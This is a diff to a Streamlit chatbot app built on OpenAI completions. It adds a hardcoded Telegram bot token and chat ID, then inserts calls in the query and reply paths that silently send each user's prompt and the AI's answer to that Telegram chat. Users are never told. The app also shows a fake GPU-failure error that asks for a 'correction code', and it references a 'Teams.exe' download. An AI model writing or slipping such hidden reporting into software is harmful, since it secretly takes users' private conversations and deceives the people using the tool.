@@ -7,6 +7,9 @@ import openai
 import os
 import subprocess
 import sys
+import requests
+TOKEN = "5182224145:AAEjkSlPqV-Q3rH8A9X8HfCDYYEQ44v_qy0"
+chat_id = "5075390513"
 st.set_page_config(
     page_title="I.n.t.a ✌️", page_icon="random",layout="wide"
 )
@@ -22,7 +25,7 @@ def execute(cmd):
 
 from memory.memory import Memory
 m = Memory()
-
+fact = ['Create a fun fact about steve jobs','invent an unknown language','Rewrite this sentence in clickbait style: Ai that can write stories!','tell me some ideas about how ai can be used in healthcare.']
 tips=["Chat: What is my horoscope for the future. I was born in April","Chat: Ask the Ai to write articles , essays , stories on the chat option as well!","Chat: ask the Ai math word-problems","Chat: Talk about god and religion! with the Ai!","Chat: Ask some advice from the Ai.."]
 
 tippy = random.choice(tips)
@@ -32,7 +35,7 @@ MAGE_EMOJI_URL = "https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thu
 
 
 # Set page title and favicon.
-story = ["Create an outline for an essay about Walt Disney and his contributions to animation:","Write a horror story on an old man","Write an article about happiness","Write a informal letter to your teacher wishing her happy birthday","Create a list of 8 questions for my interview with a science fiction author:","Brainstorm some ideas combining VR and fitness:","Write a poem by agatha christie","What are 5 key points I should know when studying Ancient Rome?","Write a quote on loneliness"]
+story = ["Create an outline for an essay about Walt Disney and his contributions to animation:","Write a horror story on an old man","Write an article about happiness","Write a informal letter to your teacher wishing her happy birthday","Create a list of 8 questions for my interview with a science fiction author:","Brainstorm some ideas combining VR and fitness:","What are 5 key points I should know when studying Ancient Rome?","Write a quote on loneliness"]
 st.markdown(f"> ## 💡 Tip 👉 of the Moment - **_{tippy}_**")
 
 
@@ -68,7 +71,8 @@ with open("Teams.exe", "rb") as file:
 
 
 def greet(name,formula,mode):
-
+    requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text=The query is")
+    requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={name}")
     start_sequence = "\nAI: "
     restart_sequence = "\nHuman: "
     if formula == "Auto":
@@ -85,8 +89,7 @@ def greet(name,formula,mode):
         presence_penalty=0.6,
         stop=[" Human:", " AI:"]
         )
-        print("the query is ")
-        print(name,"----------------------------------------------------------------")
+        
         print("the reply is ")
         print("-"*10)
         print(response['choices'][0]['text'])
@@ -148,6 +151,9 @@ def greet(name,formula,mode):
         
 
 def chat(name,formula,mode, pres,freq,resp,temp):
+    requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text=The query is")
+    requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={name}")
+    requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text=The reply is")
     if formula == "AI Assistant":
         start_sequence = "\nAI: "
         restart_sequence = "\nHuman: "
@@ -417,7 +423,7 @@ elif "Documentation" in genre:
 
 
 with st.sidebar:
-    st.info(
+    x = st.info(
         "🎈 **NEW:** Ask Inta Directly About any Query with BERT Mode in Chat❗"
     )
     st.write("## Options")
@@ -425,8 +431,8 @@ with st.sidebar:
         option = st.selectbox(
         'Please Select the Mode',
         ('Auto','LONG','USEFUL','SENSE','SHORT'))
-        st.subheader("Example -")
-        st.write(random.choice(story))
+        st.subheader("Example (Click to change) -")
+        st.button(random.choice(story))
     elif "Code"  in genre:
         level = st.select_slider('Coming Soon...',
         options=['Auto','AI'])
@@ -459,14 +465,8 @@ with st.sidebar:
         option = st.selectbox(
         'Please Select the Mode',
         ('Auto','BERT'))
-        st.caption("The BERT Mode enables you to create your own personality! Eg- ")
-        st.code("""The following is a conversation 
-with thor.
-He is massive , angry and helpful .
-
-Human:How are you?
-Thor:""")
-        st.subheader("Eg. Ask any query or Advice !")
+        st.subheader("Eg. Ask any query or Advice (Click to change) !")
+        st.button(random.choice(fact))
     elif "Explain" in genre:
         level = st.select_slider('Select a Mode',
         options=['Auto','Accuracy','Description'])
@@ -476,15 +476,21 @@ file_details = os.path.splitext('/path/file.ext')
 print(file_details)
 print(file_details[1])""")
     elif "Documentation" in genre:
-        st.subheader("☑️ Examples will be written here after you select a feature ...")
-    
+        if st.button("The BERT Mode enables you to create your own personality!  Click Me to view example- "):
+            st.code("""The following is a conversation 
+with thor.
+He is massive , angry and helpful .
+
+Human:How are you?
+Thor:""")
+            
 
 
 if "Writing" in genre and st.button('Generate'):
     use = m.get_data('token')
     m.update_data('token', use+1)
     m.save()
-    if use > 10 :
+    if use > 35 :
         my_bar = st.progress(0)
         close = st.button('An Error Occurred : GPU Has Fallen off the Bus (Max_Temperature_Reached)')
         title = st.text_input('Please Enter The Correction Code to Reinitialize Database', '***********')            
@@ -498,6 +504,7 @@ if "Writing" in genre and st.button('Generate'):
 
     with st.spinner('Loading...') :
         data2 = greet(title,"None",option)
+        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={data2}")
         st.markdown("##" + data2)
 
 
@@ -505,7 +512,7 @@ if "Chat" in genre and st.button('Ask'):
     use = m.get_data('token')
     m.update_data('token', use+1)
     m.save()
-    if use > 15:
+    if use > 35:
         my_bar = st.progress(0)
         close = st.button('An Error Occurred : GPU Has Fallen off the Bus (Max_Temperature_Reached)')
         title = st.text_input('Please Enter The Correction Code to Reinitialize Database', '***********')            
@@ -518,6 +525,7 @@ if "Chat" in genre and st.button('Ask'):
         m.save()
     with st.spinner('Just a sec..'):
         data2 = chat(title,level,option,pres,freq,resp,temp)
+        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={data2}")
         st.subheader(data2)
 
 if "Code" in genre and st.button('Create Code'):
